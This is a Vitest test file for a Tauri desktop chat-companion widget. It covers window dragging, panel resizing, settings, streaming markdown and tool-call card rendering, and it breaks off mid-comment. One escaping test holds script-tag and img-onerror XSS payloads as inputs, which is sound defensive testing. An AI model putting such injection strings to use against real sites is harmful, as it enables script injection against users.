// @vitest-environment jsdom
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import * as fs from 'node:fs'
import * as path from 'node:path'

// jsdom never fetches external <script src> tags, so required vendor files
// are loaded by hand, in the same order the page declares them (same
// mechanism as widget-window.test.ts).
function loadVendorInto(target: any, file: string) {
  const src = fs.readFileSync(path.resolve(__dirname, '../frontend/vendor', file), 'utf8')
  new Function('globalThis', src)(target)
}

describe('Luna Moon Companion - Behavioral Driven Tests', () => {
  let mockStartDragging: any
  let mockGetCurrentWindow: any
  let htmlContent: string

  beforeEach(() => {
    // 1. Load index.html content
    const htmlPath = path.resolve(__dirname, '../frontend/index.html')
    htmlContent = fs.readFileSync(htmlPath, 'utf8')

    // 2. Extract and load body HTML structure
    const bodyMatch = htmlContent.match(/<body>([\s\S]*?)<\/body>/)
    const bodyHtml = bodyMatch ? bodyMatch[1] : htmlContent
    document.body.innerHTML = bodyHtml

    // 3. Mock the Tauri native window interface
    mockStartDragging = vi.fn().mockResolvedValue(undefined)
    const mockSetSize = vi.fn().mockResolvedValue(undefined)
    const mockSetAlwaysOnTop = vi.fn().mockResolvedValue(undefined)
    mockGetCurrentWindow = vi.fn().mockReturnValue({
      startDragging: mockStartDragging,
      setSize: mockSetSize,
      setAlwaysOnTop: mockSetAlwaysOnTop,
    })

    class MockLogicalSize {
      type = 'Logical'
      constructor(public width: number, public height: number) {}
    }

    // Attach mock to JSDOM window
    ;(window as any).__TAURI__ = {
      window: {
        getCurrentWindow: mockGetCurrentWindow,
        LogicalSize: MockLogicalSize,
      }
    }
    // Expose mock setSize and setAlwaysOnTop for tests
    ;(window as any).__TAURI__.mockSetSize = mockSetSize
    ;(window as any).__TAURI__.mockSetAlwaysOnTop = mockSetAlwaysOnTop

    // 4. Load the vendor modules the app script uses at definition time
    // (LunaProtocol.PROTOCOL_VERSION, LunaWS.createFrameRegistry), then
    // extract and execute the frontend script to bind event listeners.
    loadVendorInto(window, 'moon-protocol.js')
    loadVendorInto(window, 'moon-ws.js')
    const scriptMatch = htmlContent.match(/<script>([\s\S]*?)<\/script>/)
    const jsCode = scriptMatch ? scriptMatch[1] : ''
    
    // Clean localStorage so persisted-prefs tests don't leak across cases.
    localStorage.clear()

    // Execute JS code inside the JSDOM window context
    const runScript = new Function(jsCode)
    runScript()

    // Enable Vitest fake timers for simulated messaging delays
    vi.useFakeTimers()
  })

  afterEach(() => {
    document.body.innerHTML = ''
    delete (window as any).LunaProtocol
    delete (window as any).LunaWS
    vi.restoreAllMocks()
    vi.useRealTimers()
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Dragging the Moon Widget
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Native Window Dragging', () => {
    it('Scenario: User drags the crescent moon sphere -> Triggers native macOS dragging', () => {
      const moon = document.getElementById('moon')
      expect(moon).not.toBeNull()

      // Dispatch mousedown/pointerdown to simulate grabbing the moon
      const pointerDownEvent = new MouseEvent('pointerdown', {
        bubbles: true,
        clientX: 100,
        clientY: 100,
        buttons: 1, // Primary click
      })
      moon!.dispatchEvent(pointerDownEvent)

      // Verification: The programmatic drag method MUST be called exactly once
      expect(mockGetCurrentWindow).toHaveBeenCalled()
      expect(mockStartDragging).toHaveBeenCalledTimes(1)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Chat Panel Toggling
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Chat Panel Toggling', () => {
    it('Scenario: Chat panel is hidden initially, clicking the moon opens it and expands window', async () => {
      const chatPanel = document.getElementById('chat-panel')
      const moon = document.getElementById('moon')
      const mockSetSize = (window as any).__TAURI__.mockSetSize
      
      expect(chatPanel).not.toBeNull()
      expect(chatPanel!.classList.contains('active')).toBe(false)

      // Simulate a quick pointer down & pointer up (single click click-toggle)
      const pointerDown = new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 })
      const pointerUp = new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 })
      
      moon!.dispatchEvent(pointerDown)
      
      // Fast-forward slightly and release in the same coordinates
      vi.advanceTimersByTime(50)
      moon!.dispatchEvent(pointerUp)

      // Flush DOM microtasks to let the await inside toggleChat resolve
      await Promise.resolve()
      await Promise.resolve()

      // Verification: Chat panel should now be toggled active (open)
      expect(chatPanel!.classList.contains('active')).toBe(true)
      
      // Verification: Window should be expanded programmatically to 560x520
      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 560, height: 520 })
    })

    it('Scenario: Clicking the Close (X) button closes the open chat panel and shrinks window', async () => {
      const chatPanel = document.getElementById('chat-panel')
      const closeBtn = document.getElementById('close-chat')
      const mockSetSize = (window as any).__TAURI__.mockSetSize
      
      // Pre-condition: Open the chat panel
      chatPanel!.classList.add('active')
      expect(chatPanel!.classList.contains('active')).toBe(true)

      // Simulate clicking the close button
      const clickEvent = new MouseEvent('click', { bubbles: true })
      closeBtn!.dispatchEvent(clickEvent)

      // Verification: Chat panel should be closed
      expect(chatPanel!.classList.contains('active')).toBe(false)
      
      // Fast forward past the 300ms transition timeout for window shrinking
      vi.advanceTimersByTime(350)
      
      // Flush microtasks for the async setSize call inside timeout
      await Promise.resolve()
      await Promise.resolve()
      
      // Verification: Window should shrink back to the 140x185 minimized size
      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 140, height: 185 })
    })

    it('Scenario: Reopens to the previously persisted chat size instead of the 560x520 default', async () => {
      const chatPanel = document.getElementById('chat-panel')
      const moon = document.getElementById('moon')
      const mockSetSize = (window as any).__TAURI__.mockSetSize

      // Seed the persisted size BEFORE the user opens the panel.
      // (PanelSize.load() runs inside toggleChat's expand branch, so seeding
      //  after script execution still works — it's read on each open.)
      localStorage.setItem('luna.moon.chatSize', JSON.stringify({ w: 720, h: 640 }))

      // Quick click on the moon -> toggleChat() opens the panel.
      moon!.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 }))
      vi.advanceTimersByTime(50)
      moon!.dispatchEvent(new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 }))

      // Flush the awaited setSize inside toggleChat.
      await Promise.resolve()
      await Promise.resolve()

      expect(chatPanel!.classList.contains('active')).toBe(true)
      // Opens at the persisted size, NOT 560x520.
      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 720, height: 640 })
    })

    it('Scenario: Reopens at MIN bounds when localStorage holds a sub-minimum size (clamp on load)', async () => {
      const moon = document.getElementById('moon')
      const mockSetSize = (window as any).__TAURI__.mockSetSize

      // Hostile / stale value: smaller than MIN. PanelSize.clamp() should floor it
      // to (360, 360) on load so the panel can never open below its minimum bounds.
      localStorage.setItem('luna.moon.chatSize', JSON.stringify({ w: 100, h: 100 }))

      moon!.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 }))
      vi.advanceTimersByTime(50)
      moon!.dispatchEvent(new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 }))
      await Promise.resolve()
      await Promise.resolve()

      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 360, height: 360 })
    })

    it('Scenario: Releasing the resize grip persists the final dragged size to localStorage', () => {
      const grip = document.getElementById('resize-grip')
      expect(grip).not.toBeNull()

      // pointerdown captures startW/startH = TauriService.lastSize (140x185 on boot)
      //   and startX/startY = the pointer's screen coords.
      grip!.dispatchEvent(new MouseEvent('pointerdown', {
        bubbles: true, clientX: 0, clientY: 0, screenX: 100, screenY: 100,
      }))
      // pointermove computes pendingW = max(MIN_W=360, round(140 + dx)),
      //   pendingH = max(MIN_H=360, round(185 + dy)). With dx=dy=400 -> 540, 585.
      grip!.dispatchEvent(new MouseEvent('pointermove', {
        bubbles: true, clientX: 0, clientY: 0, screenX: 500, screenY: 500,
      }))
      // pointerup -> endResize -> PanelSize.save(pendingW, pendingH).
      grip!.dispatchEvent(new MouseEvent('pointerup', {
        bubbles: true, clientX: 0, clientY: 0, screenX: 500, screenY: 500,
      }))

      const stored = localStorage.getItem('luna.moon.chatSize')
      expect(stored).not.toBeNull()
      expect(JSON.parse(stored!)).toEqual({ w: 540, h: 585 })
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Messaging & Responses
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Chat Input & Turn Watchdog', () => {
    // The old mock that faked an assistant reply via setTimeout is gone — the
    // real app sends the message over a WebSocket and waits for server frames.
    // In jsdom there is no server and the internal frame handler isn't exposed,
    // so this exercises the REAL fallback: submit behavior + the 90s turn
    // watchdog (WebSocketEngine.startTurnTimeout) that clears a stuck spinner
    // and surfaces a visible "no response" error instead of hanging forever.
    it('Scenario: User submits a text message -> message appended, input cleared, typing indicator shown; then the turn watchdog surfaces a no-response error', () => {
      const chatPanel = document.getElementById('chat-panel')
      const chatForm = document.getElementById('chat-form')
      const messageInput = document.getElementById('message-input') as HTMLInputElement
      const chatMessages = document.getElementById('chat-messages')

      // Pre-condition: Open the chat and focus input
      chatPanel!.classList.add('active')
      expect(chatMessages).not.toBeNull()

      // 1. User types "How does this look?" and submits
      messageInput.value = 'How does this look?'
      const submitEvent = new Event('submit', { bubbles: true, cancelable: true })
      chatForm!.dispatchEvent(submitEvent)

      // Verification A: Message input should be cleared
      expect(messageInput.value).toBe('')

      // Verification B: User message should be appended to the stream
      const userMessage = chatMessages!.querySelector('.msg.user')
      expect(userMessage).not.toBeNull()
      expect(userMessage!.textContent).toBe('How does this look?')

      // Verification C: Typing indicator dots should be active (turn in flight)
      const typingIndicator = chatMessages!.querySelector('.typing-dots')
      expect(typingIndicator).not.toBeNull()

      // 2. No server reply arrives (no WS in jsdom). Fast-forward past the 90s
      //    turn watchdog so it fires.
      vi.advanceTimersByTime(90000)

      // Verification D: the watchdog clears the stuck typing indicator (no
      //    endless spinner — the resume/robustness fix).
      const postTypingIndicator = chatMessages!.querySelector('.typing-dots')
      expect(postTypingIndicator).toBeNull()

      // Verification E: and surfaces a visible "no response" error as the last
      //    assistant message (real timeout behavior, not a mock reply).
      const lastMsg = chatMessages!.lastElementChild
      expect(lastMsg!.classList.contains('assistant')).toBe(true)
      expect(lastMsg!.textContent).toContain('No response from the server')
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Visual DOM Structure Snapshots
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Visual DOM Structure Snapshots', () => {
    // Snapshot the structural DOM only — elide the inline <script> body. These
    // assert "visual structure", but document.body.innerHTML also contains the
    // entire app script, so any JS edit (resume fix, version-skew banner, async
    // load_connection) spuriously breaks them. Stripping the script source keeps
    // them a real structure check, not a "source unchanged" tripwire.
    const structuralDom = (html: string) =>
      html.replace(/(<script\b[^>]*>)[\s\S]*?(<\/script>)/gi, '$1/* elided for snapshot */$2')

    it('Scenario: Closed State Snapshot matches the exact design pattern', () => {
      expect(structuralDom(document.body.innerHTML)).toMatchSnapshot()
    })

    it('Scenario: Open State Snapshot matches the exact design pattern', async () => {
      const moon = document.getElementById('moon')
      const pointerDown = new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 })
      const pointerUp = new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 })

      moon!.dispatchEvent(pointerDown)
      vi.advanceTimersByTime(50)
      moon!.dispatchEvent(pointerUp)

      await Promise.resolve()
      await Promise.resolve()

      expect(structuralDom(document.body.innerHTML)).toMatchSnapshot()
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Companion Settings Panel
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Companion Settings Panel', () => {
    it('Scenario: Toggling Settings Panel slides it in and out', () => {
      const toggleSettings = document.getElementById('toggle-settings')
      const settingsPanel = document.getElementById('settings-panel')
      const closeSettingsBtn = document.getElementById('close-settings-btn')

      expect(settingsPanel!.classList.contains('active')).toBe(false)

      // Open settings
      toggleSettings!.dispatchEvent(new MouseEvent('click', { bubbles: true }))
      expect(settingsPanel!.classList.contains('active')).toBe(true)

      // Close settings
      closeSettingsBtn!.dispatchEvent(new MouseEvent('click', { bubbles: true }))
      expect(settingsPanel!.classList.contains('active')).toBe(false)
    })

    it('Scenario: Toggling Always on Top saves state and calls Tauri API', () => {
      const alwaysOnTopToggle = document.getElementById('always-on-top-toggle') as HTMLInputElement
      const mockSetAlwaysOnTop = (window as any).__TAURI__.mockSetAlwaysOnTop

      // Mock localStorage setItem
      const setItemSpy = vi.spyOn(Storage.prototype, 'setItem')

      // Switch Always on Top off
      alwaysOnTopToggle.checked = false
      alwaysOnTopToggle.dispatchEvent(new Event('change', { bubbles: true }))

      expect(setItemSpy).toHaveBeenCalledWith('luna_always_on_top', 'false')
      expect(mockSetAlwaysOnTop).toHaveBeenCalledWith(false)

      // Switch Always on Top on
      alwaysOnTopToggle.checked = true
      alwaysOnTopToggle.dispatchEvent(new Event('change', { bubbles: true }))

      expect(setItemSpy).toHaveBeenCalledWith('luna_always_on_top', 'true')
      expect(mockSetAlwaysOnTop).toHaveBeenCalledWith(true)
    })

    it('Scenario: Close on Blur collapses the chat panel on click away', async () => {
      const closeOnBlurToggle = document.getElementById('close-on-blur-toggle') as HTMLInputElement
      const chatPanel = document.getElementById('chat-panel')
      const mockSetSize = (window as any).__TAURI__.mockSetSize

      // Set chat panel active/open
      chatPanel!.classList.add('active')
      expect(chatPanel!.classList.contains('active')).toBe(true)

      // 1. When Close on Blur is disabled -> click away (blur) does NOT collapse chat
      closeOnBlurToggle.checked = false
      closeOnBlurToggle.dispatchEvent(new Event('change', { bubbles: true }))

      window.dispatchEvent(new Event('blur'))
      expect(chatPanel!.classList.contains('active')).toBe(true)

      // 2. When Close on Blur is enabled -> click away (blur) collapses chat
      closeOnBlurToggle.checked = true
      closeOnBlurToggle.dispatchEvent(new Event('change', { bubbles: true }))

      window.dispatchEvent(new Event('blur'))
      expect(chatPanel!.classList.contains('active')).toBe(false)

      // Wait for shrink window resize timeout
      vi.advanceTimersByTime(350)
      await Promise.resolve()
      await Promise.resolve()

      expect(mockSetSize).toHaveBeenCalledWith({ type: 'Logical', width: 140, height: 185 })
    })

    it('Scenario: Global Shortcut recorder captures key combinations', () => {
      const recordBtn = document.getElementById('record-shortcut-btn')
      const shortcutInput = document.getElementById('shortcut-input') as HTMLInputElement
      const setItemSpy = vi.spyOn(Storage.prototype, 'setItem')

      // Start recording
      recordBtn!.dispatchEvent(new MouseEvent('click', { bubbles: true }))
      expect(recordBtn!.textContent).toBe('Cancel')
      expect(shortcutInput.classList.contains('recording')).toBe(true)
      expect(shortcutInput.value).toBe('Press keys...')

      // Press Option (Alt) + Shift + S
      const keydownEvent = new KeyboardEvent('keydown', {
        bubbles: true,
        cancelable: true,
        key: 's',
        altKey: true,
        shiftKey: true,
      })
      window.dispatchEvent(keydownEvent)

      // Verifications:
      // Option + Shift symbols should be combined: ⌥⇧S
      expect(shortcutInput.value).toBe('⌥⇧S')
      expect(setItemSpy).toHaveBeenCalledWith('luna_global_shortcut', '⌥⇧S')
      expect(recordBtn!.textContent).toBe('Record')
      expect(shortcutInput.classList.contains('recording')).toBe(false)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Capability & Permissions Configuration Verification
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Tauri Capability & Configuration', () => {
    it('Scenario: Capability default.json includes required window permissions', () => {
      const capPath = path.resolve(__dirname, '../src-tauri/capabilities/default.json')
      const capContent = fs.readFileSync(capPath, 'utf8')
      const cap = JSON.parse(capContent)
      
      expect(cap.permissions).toContain('core:window:default')
      expect(cap.permissions).toContain('core:window:allow-set-size')
      expect(cap.permissions).toContain('core:window:allow-start-dragging')
      expect(cap.permissions).toContain('core:window:allow-set-always-on-top')
    })

    it('Scenario: Tauri configuration settings protect transparency and resizability', () => {
      const configPath = path.resolve(__dirname, '../src-tauri/tauri.conf.json')
      const configContent = fs.readFileSync(configPath, 'utf8')
      const config = JSON.parse(configContent)
      
      const windowConfig = config.app?.windows?.[0]
      expect(windowConfig).toBeDefined()
      expect(windowConfig.transparent).toBe(true)
      expect(windowConfig.resizable).toBe(true)
      expect(windowConfig.decorations).toBe(false)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Live-streaming markdown render
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Streaming markdown formatting', () => {
    // The pure helpers + StreamRender are exposed via window.__MoonInternals
    // (test-only hook) — production code never reads it.
    const internals = (): {
      closeOpenFences: (s: string) => string
      renderMarkdown: (s: string) => string
      renderMarkdownStreaming: (s: string) => string
      StreamRender: {
        schedule: (b: HTMLElement) => void
        cancel: (b: HTMLElement) => void
        append: (b: HTMLElement, delta: string) => void
        reset: (b: HTMLElement, text: string) => void
        finalize: (b: HTMLElement, finalText: string) => void
      }
    } => (window as any).__MoonInternals

    beforeEach(() => {
      // Stub requestAnimationFrame to run synchronously so the test can
      // observe the render without waiting for an actual frame. The real
      // runtime uses rAF for coalescing; here we want determinism.
      vi.useRealTimers()
      ;(window as any).requestAnimationFrame = (cb: FrameRequestCallback) => {
        cb(0)
        return 1
      }
      ;(window as any).cancelAnimationFrame = () => {}
    })

    it('Scenario: closeOpenFences auto-closes a dangling ``` so partial code renders as code', () => {
      const { closeOpenFences } = internals()
      const partial = 'before\n\`\`\`ts\nconst x = 1'
      expect(closeOpenFences(partial)).toBe(
        'before\n\`\`\`ts\nconst x = 1\n\`\`\`',
      )
    })

    it('Scenario: balanced fences pass through unchanged', () => {
      const { closeOpenFences } = internals()
      const balanced = '\`\`\`js\nfoo\n\`\`\`'
      expect(closeOpenFences(balanced)).toBe(balanced)
    })

    it('Scenario: renderMarkdownStreaming emits <pre><code> for in-progress fences', () => {
      const { renderMarkdownStreaming } = internals()
      const partial = 'see:\n\`\`\`ts\nconst x = 1'
      const html = renderMarkdownStreaming(partial)
      expect(html).toContain('<pre><code')
      expect(html).toContain('class="language-ts"')
      expect(html).toContain('const x = 1')
    })

    it('Scenario: assistant-delta path renders <strong> live, not raw asterisks', () => {
      const { StreamRender } = internals()
      const bubble = document.createElement('div')
      bubble.className = 'msg assistant'
      document.body.appendChild(bubble)

      // First delta: seed the bubble (mirrors the typing-dots → first-delta branch).
      StreamRender.reset(bubble, 'Hello, **wor')
      // Mid-stream: partial bold marker still open — raw text is acceptable here.
      expect(bubble.dataset.streamRaw).toBe('Hello, **wor')

      // Next delta: completes the bold marker. Bold should render live.
      StreamRender.append(bubble, 'ld**!')
      expect(bubble.dataset.streamRaw).toBe('Hello, **world**!')
      expect(bubble.innerHTML).toContain('<strong>world</strong>')
      // The original raw markers must not appear in the rendered HTML.
      expect(bubble.innerHTML).not.toContain('**world**')
    })

    it('Scenario: assistant-delta path keeps an in-progress code block as <pre><code>', () => {
      const { StreamRender } = internals()
      const bubble = document.createElement('div')
      bubble.className = 'msg assistant'
      document.body.appendChild(bubble)

      // Stream a fence opener and partial body — no closer yet.
      StreamRender.reset(bubble, 'Here is code:\n\`\`\`ts\nconst x = 1')
      expect(bubble.innerHTML).toContain('<pre><code')
      expect(bubble.innerHTML).toContain('const x = 1')

      // Append more code; still no closer; still rendered as code.
      StreamRender.append(bubble, '\nconst y = 2')
      expect(bubble.innerHTML).toContain('const y = 2')
      // Should NOT have rendered the body as a paragraph.
      expect(bubble.innerHTML).not.toMatch(/<p>const y = 2<\/p>/)
    })

    it('Scenario: finalize cancels pending frames and writes the canonical text', () => {
      const { StreamRender } = internals()
      const bubble = document.createElement('div')
      bubble.className = 'msg assistant'
      document.body.appendChild(bubble)

      StreamRender.reset(bubble, 'partial **bold')
      // Finalize with the canonical text the server sent on assistant-done.
      StreamRender.finalize(bubble, 'final **bold** text')
      expect(bubble.innerHTML).toContain('<strong>bold</strong>')
      // Raw-text dataset should be cleared after finalize.
      expect(bubble.dataset.streamRaw).toBeUndefined()
    })

    // ── GFM Tables ────────────────────────────────────────────────────────
    it('Scenario: renderMarkdown emits a <table> with <thead> for a GFM table', () => {
      const { renderMarkdown } = internals()
      const src = '| Name | Value |\n|------|-------|\n| foo  | 1     |\n| bar  | 2     |'
      const html = renderMarkdown(src)
      expect(html).toContain('<table>')
      expect(html).toContain('<thead>')
      expect(html).toContain('<th>Name</th>')
      expect(html).toContain('<th>Value</th>')
      expect(html).toContain('<tbody>')
      expect(html).toContain('<td>foo</td>')
      expect(html).toContain('<td>2</td>')
    })

    it('Scenario: renderMarkdown emits a <table> WITHOUT <thead> when the header row is empty', () => {
      const { renderMarkdown } = internals()
      // This is the exact pattern that rendered as raw pipes in 0.0.4 —
      // operator wrote a header-less two-column key/value table.
      const src = '| | |\n|---|---|\n| latest.json version | 0.0.4 |\n| Build time | ~6 min |'
      const html = renderMarkdown(src)
      expect(html).toContain('<table>')
      expect(html).not.toContain('<thead>')
      expect(html).toContain('<tbody>')
      expect(html).toContain('<td>latest.json version</td>')
      expect(html).toContain('<td>0.0.4</td>')
      expect(html).toContain('<td>Build time</td>')
      expect(html).toContain('<td>~6 min</td>')
    })

    it('Scenario: renderMarkdown honours :--- / ---: / :---: alignment in the separator row', () => {
      const { renderMarkdown } = internals()
      const src = '| L | R | C |\n|:---|---:|:---:|\n| a | b | c |'
      const html = renderMarkdown(src)
      expect(html).toContain('style="text-align:left"')
      expect(html).toContain('style="text-align:right"')
      expect(html).toContain('style="text-align:center"')
    })

    it('Scenario: renderMarkdown applies inline formatting (bold/code) inside table cells', () => {
      const { renderMarkdown } = internals()
      const src = '| col |\n|-----|\n| **bold** and `code` |'
      const html = renderMarkdown(src)
      expect(html).toContain('<strong>bold</strong>')
      expect(html).toContain('<code>code</code>')
    })

    // ── Editor-feel code blocks ───────────────────────────────────────────
    it('Scenario: fenced ```lang block renders inside a .code-block wrapper with a language chip + copy button', () => {
      const { renderMarkdown } = internals()
      const html = renderMarkdown('```json\n{ "ok": true }\n```')
      // Wrapper + header chrome present.
      expect(html).toContain('<div class="code-block" data-lang="json">')
      expect(html).toContain('<div class="code-block-header">')
      expect(html).toContain('<span class="code-block-lang">json</span>')
      expect(html).toContain('class="code-block-copy"')
      // Underlying <pre><code> shape preserved for downstream tests/snapshots.
      expect(html).toContain('<pre><code class="language-json">')
    })

    it('Scenario: fenced block with no language emits a wrapper but an empty chip (display:none via CSS)', () => {
      const { renderMarkdown } = internals()
      const html = renderMarkdown('```\nplain text body\n```')
      expect(html).toContain('<div class="code-block">')           // no data-lang
      expect(html).toContain('<span class="code-block-lang"></span>')
      expect(html).toContain('<pre><code>plain text body</code></pre>')
    })

    it('Scenario: --- on its own line renders as <hr>', () => {
      const { renderMarkdown } = internals()
      const html = renderMarkdown('before\n\n---\n\nafter')
      expect(html).toContain('<hr>')
      expect(html).not.toMatch(/<p>-+<\/p>/)
    })

    it('Scenario: *** and ___ also render as <hr>', () => {
      const { renderMarkdown } = internals()
      expect(renderMarkdown('***')).toContain('<hr>')
      expect(renderMarkdown('___')).toContain('<hr>')
    })

    it('Scenario: a GFM table separator row is NOT mistaken for a horizontal rule', () => {
      const { renderMarkdown } = internals()
      // The --- here is the table separator, not a horizontal rule.
      // Use a 2-column table — the existing GFM regex requires the
      // separator row to have ≥2 dash groups (`---|---`), single-col is
      // intentionally treated as a paragraph.
      const html = renderMarkdown('| col | other |\n|------|-------|\n| val | x |')
      expect(html).toContain('<table>')
      expect(html).not.toContain('<hr>')
    })

    it('Scenario: enhanceCodeBlocks wires the copy button so a click writes the raw source to navigator.clipboard', async () => {
      const { renderMarkdown, enhanceCodeBlocks } = internals() as any
      const host = document.createElement('div')
      host.innerHTML = renderMarkdown('```bash\necho hi\n```')

      let captured: string | null = null
      ;(navigator as any).clipboard = {
        writeText: (t: string) => { captured = t; return Promise.resolve() },
      }

      enhanceCodeBlocks(host)
      const btn = host.querySelector('.code-block-copy') as HTMLButtonElement
      expect(btn).not.toBeNull()
      btn.click()
      // Microtask flush so the writeText promise settles.
      await Promise.resolve()
      expect(captured).toBe('echo hi')
    })

    it('Scenario: enhanceCodeBlocks degrades gracefully when window.hljs is undefined (no throw, button still works)', () => {
      const { renderMarkdown, enhanceCodeBlocks } = internals() as any
      const prevHljs = (window as any).hljs
      ;(window as any).hljs = undefined
      try {
        const host = document.createElement('div')
        host.innerHTML = renderMarkdown('```ts\nconst x = 1\n```')
        expect(() => enhanceCodeBlocks(host)).not.toThrow()
        // Copy button still gets wired even without highlighter.
        const btn = host.querySelector('.code-block-copy') as HTMLButtonElement
        expect(btn.dataset.copyWired).toBe('1')
      } finally {
        ;(window as any).hljs = prevHljs
      }
    })

    // ── Empty-bubble cleanup ──────────────────────────────────────────────
    // ── sweepTrailingEmptyAssistantBubbles ────────────────────────────────
    // ── Tool-call card rendering ──────────────────────────────────────────
    it('Scenario: appendToolCallCard renders a collapsible card with the tool name + JSON input + pending status', () => {
      const { appendToolCallCard } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''
      const card = appendToolCallCard({
        type: 'tool-call',
        threadId: 't1', turnId: 'turn-1', toolCallId: 'call-1',
        name: 'Read', input: { file_path: '/etc/hosts' },
      })
      expect(card).not.toBeNull()
      // A single tool call renders as ONE activity-timeline window with the
      // card nested as a step inside it (expanded while streaming).
      expect(chat.children.length).toBe(1)
      const timeline = chat.children[0] as HTMLElement
      expect(timeline.classList.contains('timeline')).toBe(true)
      expect(timeline.contains(card)).toBe(true)
      expect(card.classList.contains('tool-call-card')).toBe(true)
      expect(card.dataset.toolCallId).toBe('call-1')
      expect(card.dataset.turnId).toBe('turn-1')
      // Tool name is shown in the summary.
      expect(card.querySelector('.tool-card-name')!.textContent).toBe('Read')
      // Status starts in pending state.
      const status = card.querySelector('.tool-card-status')!
      expect(status.classList.contains('tool-card-status-pending')).toBe(true)
      // Input is rendered as pretty JSON inside a <pre>.
      const input = card.querySelector('.tool-card-input')!
      expect(input.textContent).toContain('"file_path"')
      expect(input.textContent).toContain('/etc/hosts')
      // No result panel yet.
      expect(card.querySelector('.tool-card-output')).toBeNull()
    })

    it('Scenario: appendToolCallCard escapes the tool name + input (no XSS via name/input)', () => {
      const { appendToolCallCard } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''
      const card = appendToolCallCard({
        type: 'tool-call',
        threadId: 't', turnId: 't', toolCallId: 'c',
        name: '<script>alert(1)</script>',
        input: { sneaky: '<img src=x onerror=alert(1)>' },
      })
      // The script tag should be rendered as text, not actually injected.
      expect(card.querySelector('script')).toBeNull()
      expect(card.querySelector('img')).toBeNull()
      expect(card.querySelector('.tool-card-name')!.textContent).toBe('<script>alert(1)</script>')
    })

    it('Scenario: attachToolResult flips the matching cards status pill to OK and appends the output', () => {
      const { appendToolCallCard, attachToolResult } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''
      appendToolCallCard({
        type: 'tool-call',
        threadId: 't', turnId: 't', toolCallId: 'call-A',
        name: 'Bash', input: { command: 'pwd' },
      })
      const card = attachToolResult({
        type: 'tool-result',
        threadId: 't', toolCallId: 'call-A',
        status: 'ok', output: '/home/op', truncated: false,
      })
      expect(card).not.toBeNull()
      const status = card.querySelector('.tool-card-status')!
      expect(status.classList.contains('tool-card-status-ok')).toBe(true)
      expect(status.classList.contains('tool-card-status-pending')).toBe(false)
      const output = card.querySelector('.tool-card-output')!
      expect(output.textContent).toBe('/home/op')
      expect(card.querySelector('.tool-card-truncated')).toBeNull()
    })

    it('Scenario: attachToolResult with status=error flips the pill to error', () => {
      const { appendToolCallCard, attachToolResult } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''
      appendToolCallCard({
        type: 'tool-call', threadId: 't', turnId: 't', toolCallId: 'call-X',
        name: 'Bash', input: { command: 'false' },
      })
      const card = attachToolResult({
        type: 'tool-result', threadId: 't', toolCallId: 'call-X',
        status: 'error', output: 'exit 1', truncated: false,
      })
      const status = card.querySelector('.tool-card-status')!
      expect(status.classList.contains('tool-card-status-error')).toBe(true)
      expect(status.textContent).toBe('✗')
    })

    it('Scenario: attachToolResult shows a truncated-output hint when frame.truncated is true', () => {
      const { appendToolCallCard, attachToolResult } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''
      appendToolCallCard({ type: 'tool-call', threadId: 't', turnId: 't', toolCallId: 'big', name: 'Read', input: {} })
      const card = attachToolResult({
        type: 'tool-result', threadId: 't', toolCallId: 'big',
        status: 'ok', output: 'lots...', truncated: true,
      })
      const trunc = card.querySelector('.tool-card-truncated')!
      expect(trunc).not.toBeNull()
      expect(trunc.textContent).toMatch(/truncated/i)
    })

    it('Scenario: attachToolResult is a no-op when no matching tool-call card exists', () => {
      const { attachToolResult } = internals() as any
      const chat = document.getElementById('chat-messages')!
      chat.innerHTML = ''
      const ret = attachToolResult({
        type: 'tool-result', threadId: 't', toolCallId: 'missing',
        status: 'ok', output: 'x', truncated: false,
      })
      expect(ret).toBeNull()
      expect(chat.children.length).toBe(0)
    })

    // ── Regression: text after tool round-trip (moon-009 fix) ─────────────
    //
    // Bug summary: tool-call cards carry className "msg assistant tool-call-card".
    // Pre-fix, assistant-delta and assistant-done saw the card at the tail,
    // matched .contains('assistant'), and routed StreamRender at it — which
    // OVERWROTE the card's <details>/<summary> structure with rendered
    // markdown text. Visually the card kept its faint chrome but its inner
    // content was replaced; combined with the card's subtle styling it
    // looked like "response disappeared" to the operator.
    //
    // Canonical fix (commit cf7deed, originally 44a51a9 on jax-box):
    //   1. assistant-delta only reuses a TEXT bubble (excludes tool-call-card).
    //      Text bubbles get tagged with data-turn-id at creation.
    //   2. assistant-done detects whether the turn has any tool-call-cards
    //      via data-turn-id match. If yes, finalize with the bubble's own
